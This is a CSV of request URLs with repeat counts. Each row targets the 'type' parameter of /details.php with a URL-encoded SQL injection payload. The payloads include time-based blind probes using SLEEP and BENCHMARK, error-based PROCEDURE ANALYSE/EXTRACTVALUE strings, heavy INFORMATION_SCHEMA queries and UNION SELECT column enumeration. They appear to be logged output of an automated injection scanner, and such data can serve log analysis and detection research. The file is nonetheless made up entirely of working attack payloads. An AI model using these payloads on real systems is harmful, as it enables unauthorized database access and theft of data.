full_url,repeat_count
/details.php?prod=5&type=2%22%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%281819%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x6e426762%29%29%29%29%29%2C1%29%20AND%20%28%22moTK%22%3D%22moTK,3012
/details.php?prod=5&type=2%22%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%281819%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x6e426762%29%29%29%29%29%2C1%29%20AND%20%28%28%22Vcja%22%3D%22Vcja,3013
/details.php?prod=5&type=2%22%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%281819%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x6e426762%29%29%29%29%29%2C1%29%20AND%20%28%28%28%22AGsM%22%3D%22AGsM,3014
/details.php?prod=5&type=2%22%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%281819%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x6e426762%29%29%29%29%29%2C1%29%20AND%20%22aSPv%22%3D%22aSPv,3015
/details.php?prod=5&type=2%22%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%281819%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x6e426762%29%29%29%29%29%2C1%29%20AND%20%28%22feMR%22%20LIKE%20%22feMR,3016
/details.php?prod=5&type=2%22%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%281819%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x6e426762%29%29%29%29%29%2C1%29%20AND%20%28%28%22nQno%22%20LIKE%20%22nQno,3017
/details.php?prod=5&type=2%22%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%281819%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x6e426762%29%29%29%29%29%2C1%29%20AND%20%28%28%28%22vwVa%22%20LIKE%20%22vwVa,3018
/details.php?prod=5&type=2%22%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%281819%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x6e426762%29%29%29%29%29%2C1%29%20AND%20%22OpUb%22%20LIKE%20%22OpUb,3019
/details.php?prod=5&type=2%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%281819%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x6e426762%29%29%29%29%29%2C1%29%20OR%20%27pBLM%27%3D%27sOUE,3020
/details.php?prod=5&type=2%27%29%29%20AS%20BJEh%20WHERE%204480%3D4480%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%281819%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x6e426762%29%29%29%29%29%2C1%29--%20QIpf,3021
/details.php?prod=5&type=2%22%29%29%20AS%20fWJg%20WHERE%204988%3D4988%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%281819%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x6e426762%29%29%29%29%29%2C1%29--%20ItKS,3022
/details.php?prod=5&type=2%27%29%20AS%20MdeB%20WHERE%208186%3D8186%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%281819%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x6e426762%29%29%29%29%29%2C1%29--%20GEiR,3023
/details.php?prod=5&type=2%22%29%20AS%20mGcI%20WHERE%206991%3D6991%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%281819%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x6e426762%29%29%29%29%29%2C1%29--%20LDkG,3024
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%281819%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x6e426762%29%29%29%29%29%2C1%29%23,3025
/details.php?prod=5&type=2%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3026
/details.php?prod=5&type=2%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3027
/details.php?prod=5&type=2%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3028
/details.php?prod=5&type=2%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3029
/details.php?prod=5&type=2%29%29%20AS%20lZYv%20WHERE%205749%3D5749%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3030
/details.php?prod=5&type=2%29%20AS%20UYLh%20WHERE%206361%3D6361%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3031
/details.php?prod=5&type=2%60%20WHERE%204719%3D4719%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3032
/details.php?prod=5&type=2%60%29%20WHERE%201401%3D1401%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3033
/details.php?prod=5&type=2%27%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3034
/details.php?prod=5&type=2%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3035
/details.php?prod=5&type=2%22%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3036
/details.php?prod=5&type=2%27%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3037
/details.php?prod=5&type=2%27%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3038
/details.php?prod=5&type=2%25%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3039
/details.php?prod=5&type=2%22%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3040
/details.php?prod=5&type=2%22%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3041
/details.php?prod=5&type=2%22%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3042
/details.php?prod=5&type=2%27%29%29%20AS%20pReW%20WHERE%202203%3D2203%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3043
/details.php?prod=5&type=2%22%29%29%20AS%20BcYr%20WHERE%207363%3D7363%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3044
/details.php?prod=5&type=2%27%29%20AS%20CwCg%20WHERE%205728%3D5728%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3045
/details.php?prod=5&type=2%22%29%20AS%20dVUv%20WHERE%204719%3D4719%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3046
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%284585%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4d744c73%29%29%29%29%29%2C1%29%23,3047
/details.php?prod=5&type=%28CASE%20WHEN%20%289508%3D9508%29%20THEN%20SLEEP%285%29%20ELSE%209508%20END%29,3048
/details.php?prod=5&type=%28SELECT%204894%20FROM%20%28SELECT%28SLEEP%285%29%29%29wdJR%29,3049
/details.php?prod=5&type=%28CASE%20WHEN%20%285126%3D5126%29%20THEN%20%28SELECT%20BENCHMARK%285000000%2CMD5%280x48645265%29%29%29%20ELSE%205126%29,3050
/details.php?prod=5&type=2%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20iVaB,3051
/details.php?prod=5&type=2%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%283237%3D3237,3052
/details.php?prod=5&type=2%29%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%28%286073%3D6073,3053
/details.php?prod=5&type=2%29%29%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%28%28%288143%3D8143,3054
/details.php?prod=5&type=2%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29,3055
/details.php?prod=5&type=2%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20UaTZ,3056
/details.php?prod=5&type=2%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%23%20tPtr,3057
/details.php?prod=5&type=2%29%20WHERE%204517%3D4517%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20XRcO,3058
/details.php?prod=5&type=2%20WHERE%207097%3D7097%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20ZfVy,3059
/details.php?prod=5&type=2%2B%28SELECT%20gZra%20WHERE%209250%3D9250%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%29%2B,3060
/details.php?prod=5&type=2%29%29%20AS%20givb%20WHERE%204183%3D4183%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20TmMP,3061
/details.php?prod=5&type=2%29%20AS%20GLhk%20WHERE%208742%3D8742%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20rILS,3062
/details.php?prod=5&type=2%60%20WHERE%206293%3D6293%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20eWWT,3063
/details.php?prod=5&type=2%60%29%20WHERE%204615%3D4615%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20pPPB,3064
/details.php?prod=5&type=2%27%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20GEVk,3065
/details.php?prod=5&type=2%27%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20aPBL,3066
/details.php?prod=5&type=2%22%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20oCpN,3067
/details.php?prod=5&type=2%27%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%28%27yGGw%27%3D%27yGGw,3068
/details.php?prod=5&type=2%27%29%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%28%28%27zfdL%27%3D%27zfdL,3069
/details.php?prod=5&type=2%27%29%29%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%28%28%28%27EECV%27%3D%27EECV,3070
/details.php?prod=5&type=2%27%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%27JaBT%27%3D%27JaBT,3071
/details.php?prod=5&type=2%27%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%28%27nQIr%27%20LIKE%20%27nQIr,3072
/details.php?prod=5&type=2%27%29%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%28%28%27ZUgH%27%20LIKE%20%27ZUgH,3073
/details.php?prod=5&type=2%27%29%29%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%28%28%28%27mXWn%27%20LIKE%20%27mXWn,3074
/details.php?prod=5&type=2%25%27%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%27BCOQ%25%27%3D%27BCOQ,3075
/details.php?prod=5&type=2%27%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%27LbrN%27%20LIKE%20%27LbrN,3076
/details.php?prod=5&type=2%22%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%28%22hbBE%22%3D%22hbBE,3077
/details.php?prod=5&type=2%22%29%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%28%28%22ebuW%22%3D%22ebuW,3078
/details.php?prod=5&type=2%22%29%29%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%28%28%28%22BwbC%22%3D%22BwbC,3079
/details.php?prod=5&type=2%22%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%22FfpT%22%3D%22FfpT,3080
/details.php?prod=5&type=2%22%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%28%22zkew%22%20LIKE%20%22zkew,3081
/details.php?prod=5&type=2%22%29%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%28%28%22Hclm%22%20LIKE%20%22Hclm,3082
/details.php?prod=5&type=2%22%29%29%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%28%28%28%22qCNL%22%20LIKE%20%22qCNL,3083
/details.php?prod=5&type=2%22%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20AND%20%22befe%22%20LIKE%20%22befe,3084
/details.php?prod=5&type=2%27%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%20OR%20%27Mxvo%27%3D%27XLGn,3085
/details.php?prod=5&type=2%27%29%20WHERE%202133%3D2133%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20NQNP,3086
/details.php?prod=5&type=2%22%29%20WHERE%205079%3D5079%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20RcvG,3087
/details.php?prod=5&type=2%27%20WHERE%203241%3D3241%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20CbSG,3088
/details.php?prod=5&type=2%22%20WHERE%205223%3D5223%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20AynD,3089
/details.php?prod=5&type=2%27%7C%7C%28SELECT%200x45656f56%20WHERE%207378%3D7378%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%29%7C%7C%27,3090
/details.php?prod=5&type=2%27%7C%7C%28SELECT%200x6b456942%20FROM%20DUAL%20WHERE%207640%3D7640%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%29%7C%7C%27,3091
/details.php?prod=5&type=2%27%2B%28SELECT%200x4d754c74%20WHERE%205026%3D5026%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%29%2B%27,3092
/details.php?prod=5&type=2%7C%7C%28SELECT%200x42796e71%20FROM%20DUAL%20WHERE%209306%3D9306%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%29%7C%7C,3093
/details.php?prod=5&type=2%7C%7C%28SELECT%200x774c6d72%20WHERE%205790%3D5790%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%29%7C%7C,3094
/details.php?prod=5&type=2%2B%28SELECT%200x6471516e%20WHERE%209394%3D9394%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%29%2B,3095
/details.php?prod=5&type=2%27%29%29%20AS%20MLwZ%20WHERE%207886%3D7886%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20raOA,3096
/details.php?prod=5&type=2%22%29%29%20AS%20LVCr%20WHERE%209770%3D9770%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20sjnM,3097
/details.php?prod=5&type=2%27%29%20AS%20UGvj%20WHERE%204388%3D4388%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20ZYGl,3098
/details.php?prod=5&type=2%22%29%20AS%20kHtV%20WHERE%204010%3D4010%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29--%20UEvf,3099
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20A%2C%20INFORMATION_SCHEMA.COLUMNS%20B%2C%20INFORMATION_SCHEMA.COLUMNS%20C%29%23,3100
/details.php?prod=5&type=%282111%3D2111%20AND%20SLEEP%285%29%29,3101
/details.php?prod=5&type=ELT%282925%3D2925%2CSLEEP%285%29%29,3102
/details.php?prod=5&type=MAKE_SET%285174%3D5174%2CSLEEP%285%29%29,3103
/details.php?prod=5&type=2%2C%28SELECT%20%28CASE%20WHEN%20%287528%3D7528%29%20THEN%20SLEEP%285%29%20ELSE%207528%20END%29%29,3104
/details.php?prod=5&type=2%27%2C%28SELECT%20%28CASE%20WHEN%20%287528%3D7528%29%20THEN%20SLEEP%285%29%20ELSE%207528%20END%29%29--%20isZC,3105
/details.php?prod=5&type=2%2C%28SELECT%20%28CASE%20WHEN%20%285243%3D5243%29%20THEN%20%28SELECT%20BENCHMARK%285000000%2CMD5%280x47497353%29%29%29%20ELSE%205243%2A%28SELECT%205243%20FROM%20mysql.db%29%20END%29%29,3106
/details.php?prod=5&type=2%27%2C%28SELECT%20%28CASE%20WHEN%20%285243%3D5243%29%20THEN%20%28SELECT%20BENCHMARK%285000000%2CMD5%280x47497353%29%29%29%20ELSE%205243%2A%28SELECT%205243%20FROM%20mysql.db%29%20END%29%29--%20vvwz,3107
/details.php?prod=5&type=2%29%20UNION%20ALL%20SELECT%20NULL--%20-,3108
/details.php?prod=5&type=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20-,3109
/details.php?prod=5&type=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20-,3110
/details.php?prod=5&type=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20-,3111
/details.php?prod=5&type=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-,3112
/details.php?prod=5&type=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-,3113
/details.php?prod=5&type=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-,3114
/details.php?prod=5&type=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-,3115
/details.php?prod=5&type=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-,3116
/details.php?prod=5&type=2%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-,3117
/details.php?prod=5&type=2%29%29%20UNION%20ALL%20SELECT%20NULL--%20-,3118
/details.php?prod=5&type=2%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20-,3119
